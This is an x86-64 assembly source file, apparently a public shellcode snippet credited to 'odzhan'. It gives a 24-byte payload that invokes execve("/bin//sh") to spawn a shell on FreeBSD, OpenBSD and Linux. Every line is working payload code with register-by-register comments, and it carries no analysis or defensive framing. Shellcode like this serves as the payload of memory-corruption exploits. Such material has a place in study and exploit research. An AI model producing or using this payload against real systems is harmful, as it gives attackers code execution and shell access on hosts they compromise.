
; 24 byte execve("/bin//sh", {"/bin//sh", NULL}, 0);
; x64 versions of freebsd + openbsd + linux
; odzhan

    bits 64

start64:
    push    59
    pop     rax              ; rax=sys_execve
    cdq                      ; rdx=envp=0
    mov     rbx, 0x68732f2f6e69622f ; "/bin//sh"
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh", 0
    ; ---------
    push    rdx              ; argv[1]=NULL
    push    rdi              ; argv[0]="/bin//sh", 0
    push    rsp
    pop     rsi              ; rsi=argv
    ; ---------
    syscall